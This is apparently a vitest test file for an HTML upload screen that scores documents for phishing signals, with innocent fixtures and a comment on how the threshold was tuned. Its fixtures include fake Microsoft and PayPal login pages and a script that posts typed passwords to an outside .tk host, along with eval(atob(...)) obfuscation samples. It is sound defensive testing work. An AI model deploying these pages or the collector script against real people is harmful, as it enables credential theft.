// What the upload screen must get right, written as the documents it will
// actually meet.
//
// HOW THE WEIGHTS WERE TUNED
//
// The screen flags a customer's upload to a human queue, so the expensive
// mistake is the false positive: an honest deck that costs an operator a look
// and, if we ever act on it, costs us the customer. The weights were set by
// starting from the innocent fixtures and pushing the threshold above every
// score they could reach, then checking the phishing fixtures still cleared it.
//
//   Round 1 — one signal, weight 40, threshold 40. The chart fixture flagged:
//     a bundled minified script is one very long line, and so is an obfuscated
//     payload. Splitting "obfuscated script" into the two things it was
//     conflating — the unambiguous markers (eval(atob(, unescape(%u), which
//     nothing legitimate does, and a long single line, which half the
//     JavaScript on the web does — is what fixed it. 30 and 10.
//   Round 2 — the Calendly fixture. An embed is an external iframe, so
//     "external iframe" as a signal flagged every proposal with a booking
//     link. The signal is a HIDDEN external iframe; a visible embed is a
//     feature of the product we sell. Score 0, as it should be.
//   Round 3 — the product-mockup fixture (a password box, no brand). 30 on its
//     own, and a screenshot-of-a-login-form slide is a normal thing to send.
//     That fixed the threshold above every single signal: 50.
//   Round 4 — the Microsoft fixture. Password box 30 + brand-near-sign-in 30 =
//     60, and it also posts off-domain, so 85. Clear.
//
// The invariant that came out of it, asserted at the bottom of this file: no
// single signal can flag a document. Every one of them has an innocent
// explanation on its own; two of them together stop having one.

import { describe, expect, it } from 'vitest';
import { screenHtml, SCREEN_FLAG_THRESHOLD } from './screen-html';

// --- the phishing kits -----------------------------------------------------

const FAKE_MICROSOFT_LOGIN = `<!doctype html>
<html><head><title>Sign in to your Microsoft account</title></head>
<body>
  <img src="https://cdn.example-mail.ru/ms-logo.png" alt="Microsoft">
  <h1>Sign in</h1>
  <p>Your session has expired. Please sign in to continue to Office 365.</p>
  <form action="https://secure-verify-account.tk/collect.php" method="post">
    <input type="email" name="loginfmt" placeholder="Email, phone, or Skype">
    <input type="password" name="passwd" placeholder="Password">
    <button type="submit">Sign in</button>
  </form>
</body></html>`;

const FAKE_PAYPAL_VERIFY = `<!doctype html>
<html><body>
  <h2>PayPal &mdash; verify your account</h2>
  <p>We noticed unusual sign in activity. Confirm your identity to restore access.</p>
  <form action="https://ppl-resolve-center.xyz/step2" method="post">
    <input type="text" name="email">
    <input type="password" name="pw">
  </form>
</body></html>`;

// The one the 31 August review built by hand and watched score 30: a logo
// instead of the word, no <form action> at all, and a few lines of JavaScript
// that read the box and post it somewhere else. Every part of it is the part
// the original signals do not look at.
const JS_CREDENTIAL_COLLECTOR = `<!doctype html>
<html><head><title>Document access</title></head>
<body>
  <img src="/logo.png" alt="Microsoft 365">
  <h1>Sign in to view this document</h1>
  <input id="u" type="email" placeholder="Email">
  <input id="p" type="password" placeholder="Password">
  <button onclick="go()">Continue</button>
  <script>
    function go() {
      fetch('https://collect-cdn-metrics.tk/i', {
        method: 'POST',
        body: JSON.stringify({ u: document.getElementById('u').value,
                               p: document.getElementById('p').value }),
      });
    }
  </script>
</body></html>`;

// The acceptable false positive, kept as a fixture so the cost of the rule is
// written down rather than remembered: a real product's own login screen,
// pitched in a deck, with an analytics frame in the corner. It scores above
// the threshold and it should — a human glances at it once and closes it.
const BRANDED_LOGIN_PROTOTYPE = `<!doctype html>
<html><head><title>Acme — sign in prototype</title></head>
<body>
  <h1>Sign in with your Google account</h1>
  <p>This is the screen your team sees on day one.</p>
  <input type="password" placeholder="Password">
  <iframe src="https://analytics.example.net/p" width="0" height="0"></iframe>
</body></html>`;

const OBFUSCATED_REDIRECTOR = `<!doctype html>
<html><head>
  <meta http-equiv="refresh" content="3;url=https://collect.example-bad.tk/go">
</head><body>
  <script>eval(atob('ZG9jdW1lbnQubG9jYXRpb249Imh0dHBzOi8vYmFkIg=='));</script>
</body></html>`;

// --- the honest documents --------------------------------------------------

const ORDINARY_DECK = `<!doctype html>
<html><head><title>Q3 board update</title></head>
<body>
  <h1>Q3 board update</h1>
  <p>Revenue grew 18% quarter on quarter. Questions to
     <a href="mailto:founders@acme.com">founders@acme.com</a>.</p>
  <p>Our stack runs on Google Cloud and we ship weekly.</p>
</body></html>`;

const PROPOSAL_WITH_CALENDLY = `<!doctype html>
<html><head><title>Proposal for Northwind</title></head>
<body>
  <h1>Proposal for Northwind</h1>
  <p>Scope, timeline and price are below. Book a call when you are ready.</p>
  <iframe src="https://calendly.com/acme/intro" width="100%" height="700"
          frameborder="0"></iframe>
  <a href="https://acme.com/terms">Terms</a>
</body></html>`;

// One minified bundle on one line, which is what every charting library looks
// like when it is inlined rather than loaded from a CDN.
const INTERACTIVE_CHART = `<!doctype html>
<html><head><title>Usage by week</title></head>
<body>
  <canvas id="c"></canvas>
  <script>${'var a=1,b=2,c=function(x){return x*2};'.repeat(600)}</script>
  <a href="https://acme.com">acme.com</a>
</body></html>`;

// A slide showing what the sign-in screen of the product being pitched looks
// like. A password box, no brand being imitated, nothing posted anywhere.
const PRODUCT_MOCKUP = `<!doctype html>
<html><body>
  <h2>What your team sees on day one</h2>
  <form>
    <input type="email" placeholder="work email">
    <input type="password" placeholder="choose a password">
  </form>
</body></html>`;

// A newsletter sign-up posting to the email provider, which the document names
// nowhere else. One signal, deliberately not enough on its own.
const NEWSLETTER_SIGNUP = `<!doctype html>
<html><body>
  <h1>The Acme letter</h1>
  <form action="https://acme.us7.list-manage.com/subscribe/post" method="post">
    <input type="email" name="EMAIL">
    <button>Subscribe</button>
  </form>
</body></html>`;

const PLAIN_TEXT_PAGE = `<!doctype html><html><body><p>Notes from the call.</p></body></html>`;

describe('screenHtml — the documents it must flag', () => {
  it('scores a fake Microsoft sign-in page far above the threshold', () => {
    const { score, signals } = screenHtml(FAKE_MICROSOFT_LOGIN);
    expect(signals).toContain('password-input');
    expect(signals).toContain('brand-login-wording');
    expect(signals).toContain('cross-domain-form-action');
    expect(score).toBeGreaterThanOrEqual(SCREEN_FLAG_THRESHOLD);
  });

  it('scores a fake PayPal verification page above the threshold', () => {
    const { score } = screenHtml(FAKE_PAYPAL_VERIFY);
    expect(score).toBeGreaterThanOrEqual(SCREEN_FLAG_THRESHOLD);
  });

  // A logo, a password box and four lines of JavaScript: no <form action>
  // anywhere, which is what the form signal alone could never see.
  it('scores a JavaScript credential collector with a logo above the threshold', () => {
    const { score, signals } = screenHtml(JS_CREDENTIAL_COLLECTOR);
    expect(signals).toContain('password-input');
    expect(signals).toContain('brand-login-wording');
    expect(signals).toContain('exfiltration-script');
    expect(signals).not.toContain('cross-domain-form-action');
    expect(score).toBeGreaterThanOrEqual(SCREEN_FLAG_THRESHOLD);
  });

  // The brand is only in the alt text. Take that away and the same page is 55,
  // which still flags — the alt text is what makes it read as an imitation
  // rather than as a login box.
  it('reads a brand out of an image alt attribute', () => {
    const withoutAlt = JS_CREDENTIAL_COLLECTOR.replace('alt="Microsoft 365"', 'alt=""');
    expect(screenHtml(withoutAlt).signals).not.toContain('brand-login-wording');
    expect(screenHtml(JS_CREDENTIAL_COLLECTOR).score).toBeGreaterThan(screenHtml(withoutAlt).score);
  });

  it('scores an obfuscated off-site redirector above the threshold', () => {
    const { score, signals } = screenHtml(OBFUSCATED_REDIRECTOR);
    expect(signals).toEqual(['obfuscated-script', 'meta-refresh-external']);
    expect(score).toBeGreaterThanOrEqual(SCREEN_FLAG_THRESHOLD);
  });
});

describe('screenHtml — the documents it must leave alone', () => {
  it('scores an ordinary deck with a mailto link at zero', () => {
    expect(screenHtml(ORDINARY_DECK)).toEqual({ score: 0, signals: [] });
  });

  it('scores a proposal with a Calendly embed at zero', () => {
    expect(screenHtml(PROPOSAL_WITH_CALENDLY)).toEqual({ score: 0, signals: [] });
  });

  it('keeps an interactive chart with a bundled script well below the threshold', () => {
    const { score, signals } = screenHtml(INTERACTIVE_CHART);
    expect(signals).toEqual(['single-line-script-blob']);
    expect(score).toBeLessThan(SCREEN_FLAG_THRESHOLD);
  });

  it('keeps a product mockup with a password box below the threshold', () => {
    const { score, signals } = screenHtml(PRODUCT_MOCKUP);
    expect(signals).toEqual(['password-input']);
    expect(score).toBeLessThan(SCREEN_FLAG_THRESHOLD);
  });

  it('keeps a newsletter form posting to its email provider below the threshold', () => {
    const { score, signals } = screenHtml(NEWSLETTER_SIGNUP);
    expect(signals).toEqual(['cross-domain-form-action']);
    expect(score).toBeLessThan(SCREEN_FLAG_THRESHOLD);
  });

  // Deliberately not "leave alone": it is here to record what the rule costs.
  it('flags a legitimate branded login prototype, which is the accepted cost', () => {
    const { score } = screenHtml(BRANDED_LOGIN_PROTOTYPE);
    expect(score).toBeGreaterThanOrEqual(SCREEN_FLAG_THRESHOLD);
  });

  // The shape that would be expensive to get wrong: a page that reads a form
  // and posts it to the same place it already loads code from is a product,
  // not a collector.
  it('leaves a form that posts to a domain the document already names alone', () => {
    const html = `<script src="https://api.acme.com/sdk.js"></script>
      <input type="password">
      <script>fetch('https://api.acme.com/session', { body: document.forms[0].elements[0].value });</script>`;
    const { score, signals } = screenHtml(html);
    expect(signals).not.toContain('exfiltration-script');
    expect(score).toBeLessThan(SCREEN_FLAG_THRESHOLD);
  });

  it('scores a page of plain prose at zero', () => {
    expect(screenHtml(PLAIN_TEXT_PAGE)).toEqual({ score: 0, signals: [] });
  });

  it('does not read a brand mentioned far from unrelated sign-in wording', () => {
    const deck = `<p>We migrated to Google Workspace in March.</p>
      ${'<p>Filler about the migration and what it cost us.</p>'.repeat(20)}
      <p><a href="https://acme.com/login">Log in to the customer portal</a></p>`;
    expect(screenHtml(deck).signals).not.toContain('brand-login-wording');
  });

  it('reads a hidden off-site iframe but does not flag on it alone', () => {
    const html = `<iframe src="https://tracker.example.net/p" width="0" height="0"></iframe>`;
    const { score, signals } = screenHtml(html);
    expect(signals).toEqual(['hidden-external-iframe']);
    expect(score).toBeLessThan(SCREEN_FLAG_THRESHOLD);
  });
});

describe('screenHtml — the invariant the threshold rests on', () => {
  it('never flags a document on one signal', () => {
    // Each fixture below trips exactly one signal. If any of them reaches the
    // threshold, the threshold is wrong, not the fixture.
    const oneSignalEach = [
      PRODUCT_MOCKUP,
      NEWSLETTER_SIGNUP,
      INTERACTIVE_CHART,
      `<iframe src="https://x.example.net/p" style="display:none"></iframe>`,
      `<meta http-equiv="refresh" content="0;url=https://elsewhere.example.net/">`,
      `<script>unescape('%u4141')</script>`,
      `<h1>Microsoft</h1><p>Sign in below.</p>`,
      `<img alt="PayPal"><p>Log in to continue.</p>`,
      `<input type="text" id="q"><script>fetch('https://elsewhere.example.net/c', { body: document.getElementById('q').value });</script>`,
    ];
    for (const html of oneSignalEach) {
      const { score, signals } = screenHtml(html);
      expect(signals.length, html.slice(0, 60)).toBe(1);
      expect(score, html.slice(0, 60)).toBeLessThan(SCREEN_FLAG_THRESHOLD);
    }
  });

  it('returns the same signals in the same order for the same document', () => {
    expect(screenHtml(FAKE_MICROSOFT_LOGIN).signals).toEqual(
      screenHtml(FAKE_MICROSOFT_LOGIN).signals,
    );
  });
});
